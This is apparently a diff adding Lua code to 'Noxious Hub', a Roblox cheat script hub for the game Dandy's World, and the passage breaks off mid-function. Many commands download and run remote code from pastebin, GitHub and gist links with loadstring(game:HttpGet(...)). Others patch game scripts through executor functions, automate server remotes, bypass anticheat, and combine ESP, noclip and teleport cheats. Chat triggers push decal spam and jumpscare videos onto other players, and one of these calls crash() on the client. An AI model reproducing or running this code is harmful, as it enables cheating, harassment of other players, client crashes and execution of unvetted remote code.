+addcommand("soupdwscript", "soup", function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/jjTq76Sp"))()
+end)
+
+addcommand("ffjdwscript", "ffj", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/Loader.lua"))()
+end)
+
+addcommand("poltergeist", "jaonoobao", function()
+	loadstring(game:HttpGet('https://pastebin.com/raw/VQnHXGLC'))()
+end)
+
+addcommand("otvajniflyscript", "otvajnifly", function()
+	loadstring(game:HttpGet"https://pastebin.com/raw/PDdkDsgy")()
+end)
+
+addcommand("mobilekeyboard", "mk", function()
+	loadstring(game:HttpGet"https://gist.githubusercontent.com/RedZenXYZ/4d80bfd70ee27000660e4bfa7509c667/raw/da903c570249ab3c0c1a74f3467260972c3d87e6/KeyBoard%2520From%2520Ohio%2520Fr%2520Fr")()
+end)
+
+addcommand("infiniteyield", "iy", function()
+	loadstring(game:HttpGet"https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")()
+end)
+
+addcommand("explorer", "dex", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local macroEnabled = false
+local macroDelay = 0.1
+local macroConnection = nil
+
+function isInItemsFolder(prompt)
+	local currentroom = workspace:WaitForChild("CurrentRoom")
+	local modelInRoom = currentroom:FindFirstChildWhichIsA("Model")
+	local itemsFolder = modelInRoom:WaitForChild("Items")
+	local parent = prompt.Parent
+	while parent do
+		if parent.Parent == itemsFolder then
+			return true
+		end
+		parent = parent.Parent
+	end
+	return false
+end
+
+function fireItemProximityPrompts()
+	local currentroom = workspace:WaitForChild("CurrentRoom")
+	local modelInRoom = currentroom:FindFirstChildWhichIsA("Model")
+	local itemsFolder = modelInRoom:WaitForChild("Items")
+	for _, v in ipairs(itemsFolder:GetDescendants()) do
+		if v:IsA("ProximityPrompt") and isInItemsFolder(v) then
+			fireproximityprompt(v)
+		end
+	end
+end
+
+function onItemAdded()
+	fireItemProximityPrompts()
+end
+
+function runMacro()
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local inGamePlayers = workspace:WaitForChild("InGamePlayers")
+
+	while macroEnabled do
+		local plrName = noxious["username"]
+		local character = noxious["character"]
+
+		if not character or not character:FindFirstChild("Inventory") then break end
+
+		local abilityArgs = {
+			inGamePlayers:WaitForChild(plrName),
+			CFrame.new(-98.01789, 145.92488, 137.47554, -0.91248, 0, 0.40912, 0, 1, 0, -0.40912, 0, -0.91248),
+			false
+		}
+		ReplicatedStorage:WaitForChild("Events"):WaitForChild("AbilityEvent"):InvokeServer(unpack(abilityArgs))
+
+		local itemArgs = {
+			inGamePlayers:WaitForChild(plrName),
+			character:WaitForChild("Inventory"):WaitForChild("Slot1")
+		}
+		ReplicatedStorage:WaitForChild("Events"):WaitForChild("ItemEvent"):InvokeServer(unpack(itemArgs))
+
+		task.wait(macroDelay)
+	end
+end
+
+addcommand("enablebassiemacro", "ebm", function(delay)
+	if not checktoon("Bassie") then return end
+	execcmd("nccam")
+
+	local currentroom = workspace:WaitForChild("CurrentRoom")
+	local modelInRoom = currentroom:FindFirstChildWhichIsA("Model")
+	local itemsFolder = modelInRoom:WaitForChild("Items")
+	if macroConnection then macroConnection:Disconnect() end
+	macroConnection = itemsFolder.ChildAdded:Connect(onItemAdded)
+
+	delay = tonumber(delay)
+	if delay then
+		macroDelay = delay
+	end
+	macroEnabled = true
+	task.spawn(runMacro)
+end)
+
+addcommand("disablebassiemacro", "dbm", function()
+	if not checktoon("Bassie") then return end
+	macroEnabled = false
+	if macroConnection then
+		macroConnection:Disconnect()
+		macroConnection = nil
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("noclipcamera", "nccam", function()
+	local sc = (debug and debug.setconstant) or setconstant
+	local gc = (debug and debug.getconstants) or getconstants
+	if not sc or not getgc or not gc then
+		return notify("Your executor does not support this command.", 5, "error")
+	end
+	local pop = noxious["local player"].PlayerScripts.PlayerModule.CameraModule.ZoomController.Popper
+	for _, v in pairs(getgc()) do
+		if type(v) == 'function' and getfenv(v).script == pop then
+			for i, v1 in pairs(gc(v)) do
+				if tonumber(v1) == .25 then
+					sc(v, i, 0)
+				elseif tonumber(v1) == 0 then
+					sc(v, i, .25)
+				end
+			end
+		end
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("enableshiftlock", "esl", function()
+	if noxious["is mobile?"] then loadstring(game:HttpGet('https://pastebin.com/raw/CjNsnSDy'))() return end
+	noxious["local player"].DevEnableMouseLock = true
+	game:GetService("Players").LocalPlayer.PlayerScripts.PlayerModule.CameraModule.MouseLockController.BoundKeys.Value = "LeftControl"
+end)
+
+addcommand("disableshiftlock", "dsl", function()
+	noxious["local player"].DevEnableMouseLock = false
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("chat", "talk", function(target, ...)
+	local text = table.concat({...}, " ")
+	local Players = noxious["players"]
+
+	local function bubl(player)
+		if player.Character and player.Character:FindFirstChild("Head") then
+			noxious["text chat service"]:Chat(player.Character.Head, text, Enum.ChatColor.White)
+		end
+	end
+
+	local targets = {}
+
+	if not target or target == "" or target == "me" then
+		table.insert(targets, Players.LocalPlayer)
+	elseif target == "random" then
+		local all = Players:GetPlayers()
+		if #all > 0 then
+			table.insert(targets, all[math.random(1, #all)])
+		end
+	elseif target == "others" then
+		for _, p in ipairs(Players:GetPlayers()) do
+			if p ~= Players.LocalPlayer then
+				table.insert(targets, p)
+			end
+		end
+	elseif target == "all" then
+		targets = Players:GetPlayers()
+	else
+		for _, p in ipairs(Players:GetPlayers()) do
+			if string.find(string.lower(p.Name), string.lower(target)) then
+				table.insert(targets, p)
+			end
+		end
+	end
+
+	for _, p in ipairs(targets) do
+		bubl(p)
+	end
+end)
+
+function fiyah(player)
+	if player and player.Character then
+		local character = player.Character
+		local humanoid = character:FindFirstChildOfClass("Humanoid")
+
+		if humanoid then
+			for _, part in pairs(character:GetChildren()) do
+				if part:IsA("BasePart") then
+					for _, existingFire in ipairs(part:GetChildren()) do
+						if existingFire:IsA("Fire") then
+							existingFire:Destroy()
+						end
+					end
+				end
+			end
+
+			for _, part in pairs(character:GetChildren()) do
+				if part:IsA("BasePart") then
+					local fire = Instance.new("Fire")
+					fire.Size = 10
+					fire.Heat = 1
+					fire.Parent = part
+				end
+			end
+		end
+	end
+end
+
+function unfiyah(player)
+	if player and player.Character then
+		local character = player.Character
+
+		for _, part in pairs(character:GetChildren()) do
+			if part:IsA("BasePart") then
+				for _, existingFire in ipairs(part:GetChildren()) do
+					if existingFire:IsA("Fire") then
+						existingFire:Destroy()
+					end
+				end
+			end
+		end
+	end
+end
+
+addcommand("fire", "fire", function(target)
+	local players = noxious["players"]:GetPlayers()
+	local localPlayer = noxious["local player"]
+
+	if not target or target == "" or target == "me" then
+		fiyah(localPlayer)
+	elseif target == "random" then
+		if #players > 0 then
+			local randomPlayer = players[math.random(1, #players)]
+			fiyah(randomPlayer)
+		end
+	elseif target == "others" then
+		for _, player in ipairs(players) do
+			if player ~= localPlayer then
+				task.spawn(function() fiyah(player) end)
+			end
+		end
+	elseif target == "all" then
+		for _, player in ipairs(players) do
+			task.spawn(function() fiyah(player) end)
+		end
+	else
+		for _, player in ipairs(players) do
+			if string.find(string.lower(player.Name), string.lower(target)) then
+				fiyah(player)
+				break
+			end
+		end
+	end
+end)
+
+addcommand("unfire", "unfire", function(target)
+	local players = noxious["players"]:GetPlayers()
+	local localPlayer = noxious["local player"]
+
+	if not target or target == "" or target == "me" then
+		unfiyah(localPlayer)
+	elseif target == "random" then
+		if #players > 0 then
+			local randomPlayer = players[math.random(1, #players)]
+			unfiyah(randomPlayer)
+		end
+	elseif target == "others" then
+		for _, player in ipairs(players) do
+			if player ~= localPlayer then
+				task.spawn(function() unfiyah(player) end)
+			end
+		end
+	elseif target == "all" then
+		for _, player in ipairs(players) do
+			task.spawn(function() unfiyah(player) end)
+		end
+	else
+		for _, player in ipairs(players) do
+			if string.find(string.lower(player.Name), string.lower(target)) then
+				unfiyah(player)
+				break
+			end
+		end
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("usepublicloadout", "upl", function()
+	notify("Public loadout applied.", 5)
+	task.spawn(function() execcmd("eafb") end)
+	task.spawn(function() execcmd("eaesp") end)
+	task.spawn(function() execcmd("eac2") end)
+	task.spawn(function() execcmd("erin") end)
+	task.spawn(function() execcmd("edpn") end)
+end)
+
+addcommand("usesololoadout", "usl", function()
+	notify("Solo loadout applied.", 5)
+	task.spawn(function() execcmd("eafb") end)
+	task.spawn(function() execcmd("eaesp") end)
+	task.spawn(function() execcmd("eac2") end)
+	task.spawn(function() execcmd("eia") end)
+	task.spawn(function() execcmd("eatpte") end)
+	task.spawn(function() execcmd("ega") end)
+end)
+
+addcommand("useesplaodout", "uespl", function()
+	notify("ESP loadout applied.", 5)
+	task.spawn(function() execcmd("eafb") end)
+	task.spawn(function() execcmd("eaesp") end)
+	task.spawn(function() execcmd("eat") end)
+end)
+
+addcommand("usehealerloadout", "uhrl", function()
+	notify("Healer loadout applied.", 5)
+	task.spawn(function() execcmd("epesp") end)
+	task.spawn(function() execcmd("etesp") end)
+	task.spawn(function() execcmd("sph") end)
+	task.spawn(function() execcmd("etn") end)
+	task.spawn(function() execcmd("elhn") end)
+	task.spawn(function() execcmd("edpn") end)
+	task.spawn(function() execcmd("maxzoom inf") end)
+	task.spawn(function() execcmd("nccam") end)
+	task.spawn(function() execcmd("eiesp") end)
+end)
+
+addcommand("usedistractorloadout", "udl", function()
+	notify("Distractor loadout applied.", 5)
+	task.spawn(function() execcmd("efeesp") end)
+	task.spawn(function() execcmd("etesp") end)
+	task.spawn(function() execcmd("epesp") end)
+	task.spawn(function() execcmd("sph") end)
+	task.spawn(function() execcmd("etn") end)
+	task.spawn(function() execcmd("elhn") end)
+	task.spawn(function() execcmd("edpn") end)
+	task.spawn(function() execcmd("maxzoom inf") end)
+	task.spawn(function() execcmd("nccam") end)
+	task.spawn(function() execcmd("eiesp") end)
+end)
+
+addcommand("useblatantloadout", "ubl", function()
+	notify("Blatant loadout applied.", 5)
+	task.spawn(function() execcmd("eaesp") end)
+	task.spawn(function() execcmd("ecg") end)
+	task.spawn(function() execcmd("eatpte") end)
+	task.spawn(function() execcmd("eac2") end)
+	task.spawn(function() execcmd("elrs") end)
+	task.spawn(function() execcmd("tpwalk 0.2") end)
+	task.spawn(function() execcmd("noclip") end)
+	task.spawn(function() execcmd("maxzoom inf") end)
+	task.spawn(function() execcmd("nccam") end)
+	task.spawn(function() execcmd("eia") end)
+	task.spawn(function() execcmd("ega") end)
+end)
+
+addcommand("usenonblatantloadout", "unbl", function()
+	notify("Non-blatant loadout applied.", 5)
+	task.spawn(function() execcmd("eaesp") end)
+	task.spawn(function() execcmd("eac2") end)
+	task.spawn(function() execcmd("eis") end)
+	task.spawn(function() execcmd("eafb") end)
+	task.spawn(function() execcmd("maxzoom inf") end)
+	task.spawn(function() execcmd("nccam") end)
+	task.spawn(function() execcmd("minzoom 0") end)
+	task.spawn(function() execcmd("apu") end)
+	task.spawn(function() execcmd("tptool") end)
+	task.spawn(function() execcmd("spt") end)
+	task.spawn(function() execcmd("sph") end)
+	task.spawn(function() execcmd("deesp") end)
+	task.spawn(function() execcmd("dfeesp") end)
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+dodgetwistedconnection = nil
+isdodgingtwisted = false
+
+function dodgetwisteds()
+	if not inrun() then return end
+
+	if isdodgingtwisted then return end
+	isdodgingtwisted = true
+
+	if not noxious["humanoid root part"] or not noxious["humanoid root part"].Parent then 
+		isdodgingtwisted = false
+		return 
+	end
+
+	local originalCFrame = noxious["humanoid root part"].CFrame
+
+	task.spawn(function() 
+		execcmd("tptfe") 
+	end)
+
+	task.wait(0.5)
+
+	task.spawn(function() 
+		avoidsproutstendrils()
+	end)
+
+	task.wait(4.5)
+
+	if noxious["humanoid root part"] and noxious["humanoid root part"].Parent then
+		if not noxiousautofarmrunning then
+			local wasbypassinganticheat = bypassinganticheat
+			task.spawn(function() 
+				execcmd("eacb") 
+			end)
+
+			tpbypass(originalCFrame)
+
+			if not wasbypassinganticheat then 
+				task.spawn(function() 
+					execcmd("dacb") 
+				end) 
+			end
+		else
+			execcmd("tptg")
+		end
+	end
+
+	isdodgingtwisted = false
+end
+
+addcommand("enabledodgetwisteds", "edt", function()
+	if not inrun() then return end
+
+	if dodgetwistedconnection then return end
+	local spottedEvent = noxious["replicated storage"]:WaitForChild("StoryEvents"):WaitForChild("Spotted")
+	dodgetwistedconnection = spottedEvent.OnClientEvent:Connect(dodgetwisteds)
+end)
+
+addcommand("disaledodgetwisteds", "ddt", function()
+	if not inrun() then return end
+
+	if dodgetwistedconnection then
+		dodgetwistedconnection:Disconnect()
+		dodgetwistedconnection = nil
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function dwshrimpdecal()
+	local function replacealltextures(root)
+		for _, v in pairs(root:GetChildren()) do
+			if v:IsA("Decal") and v.Texture ~= "rbxassetid://97212326743600" then
+				v.Parent = nil
+			elseif v:IsA("BasePart") then
+				v.Material = "Plastic"
+				local One = Instance.new("Decal", v)
+				local Two = Instance.new("Decal", v)
+				local Three = Instance.new("Decal", v)
+				local Four = Instance.new("Decal", v)
+				local Five = Instance.new("Decal", v)
+				local Six = Instance.new("Decal", v)
+				One.Texture = "rbxassetid://97212326743600"
+				Two.Texture = "rbxassetid://97212326743600"
+				Three.Texture = "rbxassetid://97212326743600"
+				Four.Texture = "rbxassetid://97212326743600"
+				Five.Texture = "rbxassetid://97212326743600"
+				Six.Texture = "rbxassetid://97212326743600"
+				One.Face = "Front"
+				Two.Face = "Back"
+				Three.Face = "Right"
+				Four.Face = "Left"
+				Five.Face = "Top"
+				Six.Face = "Bottom"
+			end
+			replacealltextures(v)
+		end
+	end
+	local function applytextures(root)
+		for _, v in pairs(root:GetChildren()) do
+			applytextures(v)
+		end
+	end
+	replacealltextures(game.Workspace)
+	applytextures(game.Workspace)
+
+	local lighting = game:GetService"Lighting"
+
+	local sky = lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky")
+
+	sky.SkyboxBk = "rbxassetid://97212326743600"
+	sky.SkyboxDn = "rbxassetid://97212326743600"
+	sky.SkyboxFt = "rbxassetid://97212326743600"
+	sky.SkyboxLf = "rbxassetid://97212326743600"
+	sky.SkyboxRt = "rbxassetid://97212326743600"
+	sky.SkyboxUp = "rbxassetid://97212326743600"
+end
+
+addcommand("scriptshrimpodecalspam", "ssods", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end       
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		channel:SendAsync("/e shrimpspam")        
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function veryscarydecalspam()
+	local function replacealltextures(root)
+		for _, v in pairs(root:GetChildren()) do
+			if v:IsA("Decal") and v.Texture ~= "rbxassetid://15848332855" then
+				v.Parent = nil
+			elseif v:IsA("BasePart") then
+				v.Material = "Plastic"
+				local One = Instance.new("Decal", v)
+				local Two = Instance.new("Decal", v)
+				local Three = Instance.new("Decal", v)
+				local Four = Instance.new("Decal", v)
+				local Five = Instance.new("Decal", v)
+				local Six = Instance.new("Decal", v)
+				One.Texture = "rbxassetid://15848332855"
+				Two.Texture = "rbxassetid://15848332855"
+				Three.Texture = "rbxassetid://15848332855"
+				Four.Texture = "rbxassetid://15848332855"
+				Five.Texture = "rbxassetid://15848332855"
+				Six.Texture = "rbxassetid://15848332855"
+				One.Face = "Front"
+				Two.Face = "Back"
+				Three.Face = "Right"
+				Four.Face = "Left"
+				Five.Face = "Top"
+				Six.Face = "Bottom"
+			end
+			replacealltextures(v)
+		end
+	end
+	local function applytextures(root)
+		for _, v in pairs(root:GetChildren()) do
+			applytextures(v)
+		end
+	end
+	replacealltextures(game.Workspace)
+	applytextures(game.Workspace)
+
+	local lighting = game:GetService"Lighting"
+
+	local sky = lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky")
+
+	sky.SkyboxBk = "rbxassetid://15848332855"
+	sky.SkyboxDn = "rbxassetid://15848332855"
+	sky.SkyboxFt = "rbxassetid://15848332855"
+	sky.SkyboxLf = "rbxassetid://15848332855"
+	sky.SkyboxRt = "rbxassetid://15848332855"
+	sky.SkyboxUp = "rbxassetid://15848332855"
+end
+
+addcommand("scriptveryscarydecalspam", "svsyds", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		channel:SendAsync"/e superscaryspam"		
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function scarydecalspam()
+	local function replacealltextures(root)
+		for _, v in pairs(root:GetChildren()) do
+			if v:IsA("Decal") and v.Texture ~= "rbxassetid://112289855511517" then
+				v.Parent = nil
+			elseif v:IsA("BasePart") then
+				v.Material = "Plastic"
+				local One = Instance.new("Decal", v)
+				local Two = Instance.new("Decal", v)
+				local Three = Instance.new("Decal", v)
+				local Four = Instance.new("Decal", v)
+				local Five = Instance.new("Decal", v)
+				local Six = Instance.new("Decal", v)
+				One.Texture = "rbxassetid://112289855511517"
+				Two.Texture = "rbxassetid://112289855511517"
+				Three.Texture = "rbxassetid://112289855511517"
+				Four.Texture = "rbxassetid://112289855511517"
+				Five.Texture = "rbxassetid://112289855511517"
+				Six.Texture = "rbxassetid://112289855511517"
+				One.Face = "Front"
+				Two.Face = "Back"
+				Three.Face = "Right"
+				Four.Face = "Left"
+				Five.Face = "Top"
+				Six.Face = "Bottom"
+			end
+			replacealltextures(v)
+		end
+	end
+	local function applytextures(root)
+		for _, v in pairs(root:GetChildren()) do
+			applytextures(v)
+		end
+	end
+	replacealltextures(game.Workspace)
+	applytextures(game.Workspace)
+
+	local lighting = game:GetService"Lighting"
+
+	local sky = lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky")
+
+	sky.SkyboxBk = "rbxassetid://112289855511517"
+	sky.SkyboxDn = "rbxassetid://112289855511517"
+	sky.SkyboxFt = "rbxassetid://112289855511517"
+	sky.SkyboxLf = "rbxassetid://112289855511517"
+	sky.SkyboxRt = "rbxassetid://112289855511517"
+	sky.SkyboxUp = "rbxassetid://112289855511517"
+end
+
+addcommand("scriptscarydecalspam", "ssyds", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		channel:SendAsync"/e scaryspam"		
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function noxiousdecalspam()
+	local function replacealltextures(root)
+		for _, v in pairs(root:GetChildren()) do
+			if v:IsA("Decal") and v.Texture ~= "rbxassetid://129909577310669" then
+				v.Parent = nil
+			elseif v:IsA("BasePart") then
+				v.Material = "Plastic"
+				local One = Instance.new("Decal", v)
+				local Two = Instance.new("Decal", v)
+				local Three = Instance.new("Decal", v)
+				local Four = Instance.new("Decal", v)
+				local Five = Instance.new("Decal", v)
+				local Six = Instance.new("Decal", v)
+				One.Texture = "rbxassetid://129909577310669"
+				Two.Texture = "rbxassetid://129909577310669"
+				Three.Texture = "rbxassetid://129909577310669"
+				Four.Texture = "rbxassetid://129909577310669"
+				Five.Texture = "rbxassetid://129909577310669"
+				Six.Texture = "rbxassetid://129909577310669"
+				One.Face = "Front"
+				Two.Face = "Back"
+				Three.Face = "Right"
+				Four.Face = "Left"
+				Five.Face = "Top"
+				Six.Face = "Bottom"
+			end
+			replacealltextures(v)
+		end
+	end
+	local function applytextures(root)
+		for _, v in pairs(root:GetChildren()) do
+			applytextures(v)
+		end
+	end
+	replacealltextures(game.Workspace)
+	applytextures(game.Workspace)
+
+	local lighting = game:GetService"Lighting"
+
+	local sky = lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky")
+
+	sky.SkyboxBk = "rbxassetid://129909577310669"
+	sky.SkyboxDn = "rbxassetid://129909577310669"
+	sky.SkyboxFt = "rbxassetid://129909577310669"
+	sky.SkyboxLf = "rbxassetid://129909577310669"
+	sky.SkyboxRt = "rbxassetid://129909577310669"
+	sky.SkyboxUp = "rbxassetid://129909577310669"
+end
+
+addcommand("scriptnoxiousdecalspam", "snds", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		channel:SendAsync"/e noxiousspam"		
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function test()
+	local function test2(root)
+		for _, v in pairs(root:GetChildren()) do
+			if v:IsA("Decal") and v.Texture ~= "rbxassetid://117458353677051" then
+				v.Parent = nil
+			elseif v:IsA("BasePart") then
+				v.Material = "Plastic"
+				local One = Instance.new("Decal", v)
+				local Two = Instance.new("Decal", v)
+				local Three = Instance.new("Decal", v)
+				local Four = Instance.new("Decal", v)
+				local Five = Instance.new("Decal", v)
+				local Six = Instance.new("Decal", v)
+				One.Texture = "rbxassetid://117458353677051"
+				Two.Texture = "rbxassetid://117458353677051"
+				Three.Texture = "rbxassetid://117458353677051"
+				Four.Texture = "rbxassetid://117458353677051"
+				Five.Texture = "rbxassetid://117458353677051"
+				Six.Texture = "rbxassetid://117458353677051"
+				One.Face = "Front"
+				Two.Face = "Back"
+				Three.Face = "Right"
+				Four.Face = "Left"
+				Five.Face = "Top"
+				Six.Face = "Bottom"
+			end
+			test2(v)
+		end
+	end
+	local function test3(root)
+		for _, v in pairs(root:GetChildren()) do
+			test3(v)
+		end
+	end
+	test2(game.Workspace)
+	test3(game.Workspace)
+
+	local function replaceTextInGui(guiObject)
+		if guiObject:IsA("TextLabel") or guiObject:IsA("TextButton") then
+			guiObject.Text = "unable says hi :3"
+		end
+	end
+
+	local function replaceTextInWorkspace()
+		for _, obj in pairs(workspace:GetDescendants()) do
+			if obj:IsA("BillboardGui") or obj:IsA("SurfaceGui") then
+				for _, child in pairs(obj:GetDescendants()) do
+					replaceTextInGui(child)
+				end
+			end
+		end
+	end
+
+	replaceTextInWorkspace()
+
+	for _, gui in pairs(noxious["local player"].PlayerGui:GetDescendants()) do
+		replaceTextInGui(gui)
+	end
+
+	local imageId = "rbxassetid://117458353677051"
+
+	local function makeespbillboard(part)
+		if part:FindFirstChildOfClass("BillboardGui") then return end
+
+		local billboardGui = Instance.new("BillboardGui")			
+		billboardGui.Size = UDim2.new(3, 0, 3, 0)
+		billboardGui.AlwaysOnTop = true
+		billboardGui.Parent = part
+		billboardGui.Adornee = part
+
+		local imageLabel = Instance.new("ImageLabel")			
+		imageLabel.Size = UDim2.new(1, 0, 1, 0)
+		imageLabel.Image = imageId
+		imageLabel.BackgroundTransparency = 1
+		imageLabel.Parent = billboardGui
+	end
+
+	local function addBillboardGuis()
+		for _, descendant in pairs(workspace:GetDescendants()) do
+			if descendant:IsA("BasePart") then
+				makeespbillboard(descendant)
+			end
+		end
+
+		workspace.DescendantAdded:Connect(function(newDescendant)
+			if newDescendant:IsA("BasePart") then
+				makeespbillboard(newDescendant)
+			end
+		end)
+	end
+
+	addBillboardGuis()
+
+	local lighting = game:GetService"Lighting"
+
+	local sky = lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky")
+
+	sky.SkyboxBk = "rbxassetid://117458353677051"
+	sky.SkyboxDn = "rbxassetid://117458353677051"
+	sky.SkyboxFt = "rbxassetid://117458353677051"
+	sky.SkyboxLf = "rbxassetid://117458353677051"
+	sky.SkyboxRt = "rbxassetid://117458353677051"
+	sky.SkyboxUp = "rbxassetid://117458353677051"
+
+	sky.Parent = lighting
+end
+
+--addcommand("scriptunabledecalspam", "suds", function()
+--	if not donor(noxious["username"]) then
+--		notify("You need to be a Donor in order to execute this command.", 5, "error")
+--		return
+--	end
+--	
+--	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+--	if channel then
+--		channel:SendAsync"/e unable"		
+--	end
+--end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+videojumpscaring = false
+
+task.spawn(function()
+	if not noxious["in studio"] then
+		noxious["base folder"] = "Noxious Hub"
+		noxious["sub folder"] = noxious["base folder"] .. "/Dandy's World/Video Jumpscares"
+
+		if not isfolder(noxious["base folder"]) then makefolder(noxious["base folder"]) end
+		if not isfolder(noxious["sub folder"]) then makefolder(noxious["sub folder"]) end
+
+		noxious["olvia.webm"] = noxious["sub folder"] .. "/olvia.webm"
+		noxious["stripperblot.webm"] = noxious["sub folder"] .. "/stripperblot.webm"
+		noxious["palemachine.webm"] = noxious["sub folder"] .. "/palemachine.webm"
+		noxious["patrickbatemanscreaming.webm"] = noxious["sub folder"] .. "/patrickbatemanscreaming.webm"
+
+		if not isfile(noxious["olvia.webm"]) then writefile(noxious["olvia.webm"], game:HttpGet("https://files.catbox.moe/ip8g68.webm")) end
+		if not isfile(noxious["stripperblot.webm"]) then writefile(noxious["stripperblot.webm"], game:HttpGet("https://files.catbox.moe/24t8hz.webm")) end
+		if not isfile(noxious["palemachine.webm"]) then writefile(noxious["palemachine.webm"], game:HttpGet("https://files.catbox.moe/55t67o.webm")) end
+		if not isfile(noxious["patrickbatemanscreaming.webm"]) then writefile(noxious["patrickbatemanscreaming.webm"], game:HttpGet("https://files.catbox.moe/oj3n29.webm")) end
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function stripperblot()
+	if videojumpscaring then return end videojumpscaring = true
+	task.spawn(function()
+		local screenGui = Instance.new("ScreenGui")
+		screenGui.ResetOnSpawn = false
+		screenGui.Parent = noxious["player gui"]
+
+		local videoFrame = Instance.new("VideoFrame")
+		videoFrame.Visible = false
+		videoFrame.Looped = false	
+		videoFrame.Video = getcustomasset(noxious["stripperblot.webm"])
+		videoFrame.Volume = 1
+		videoFrame.BackgroundTransparency = 1
+		videoFrame.Size = UDim2.new(1, 0, 1, 60)
+		videoFrame.Position = UDim2.new(0, 0, 0, -60)
+		videoFrame.ZIndex = 6969
+		videoFrame.Parent = screenGui
+
+		while not videoFrame.IsLoaded do
+			task.wait()
+		end
+
+		videoFrame.Visible = true
+		videoFrame:Play()
+
+		videoFrame.Ended:Wait()
+		screenGui:Destroy()
+		videojumpscaring = false
+	end)
+end
+
+addcommand("scriptstripperblotjumpscare", "ssbjs", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		task.spawn(stripperblot)
+		channel:SendAsync"/e inkblotscare"	
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function patrickbatemanscreaming()
+	if videojumpscaring then return end videojumpscaring = true
+	task.spawn(function()
+		local screenGui = Instance.new("ScreenGui")
+		screenGui.ResetOnSpawn = false
+		screenGui.Parent = noxious["player gui"]
+
+		local videoFrame = Instance.new("VideoFrame")
+		videoFrame.Visible = false
+		videoFrame.Looped = false	
+		videoFrame.Video = getcustomasset(noxious["patrickbatemanscreaming.webm"])
+		videoFrame.Volume = 1
+		videoFrame.BackgroundTransparency = 1
+		videoFrame.Size = UDim2.new(1, 0, 1, 60)
+		videoFrame.Position = UDim2.new(0, 0, 0, -60)
+		videoFrame.ZIndex = 6969
+		videoFrame.Parent = screenGui
+
+		while not videoFrame.IsLoaded do
+			task.wait()
+		end
+
+		videoFrame.Visible = true
+		videoFrame:Play()
+
+		videoFrame.Ended:Wait()
+		screenGui:Destroy()
+		videojumpscaring = false
+	end)
+end
+
+addcommand("scriptpatrickbatemanscreamingjumpscare", "spbsjs", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		task.spawn(patrickbatemanscreaming)
+		channel:SendAsync"/e patrickscare"
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function olvia()
+	task.spawn(function()
+		if videojumpscaring then return end videojumpscaring = true
+		local screenGui = Instance.new("ScreenGui")
+		screenGui.ResetOnSpawn = false
+		screenGui.Parent = noxious["player gui"]
+
+		local videoFrame = Instance.new("VideoFrame")
+		videoFrame.Visible = false
+		videoFrame.Looped = false	
+		videoFrame.Video = getcustomasset(noxious["olvia.webm"])
+		videoFrame.Volume = 1
+		videoFrame.BackgroundTransparency = 1
+		videoFrame.Size = UDim2.new(1, 0, 1, 60)
+		videoFrame.Position = UDim2.new(0, 0, 0, -60)
+		videoFrame.ZIndex = 6969
+		videoFrame.Parent = screenGui
+
+		while not videoFrame.IsLoaded do
+			task.wait()
+		end
+
+		task.spawn(function()
+			task.wait(6.2)
+			crash()
+		end)
+
+		videoFrame.Visible = true
+		videoFrame:Play()
+		videojumpscaring = false
+	end)
+end
+
+addcommand("scriptolviajumpscare", "sojs", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		task.spawn(olvia)
+		channel:SendAsync"/e olviascare"	
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function palemachine()
+	task.spawn(function()
+		if videojumpscaring then return end videojumpscaring = true
+		local screenGui = Instance.new("ScreenGui")
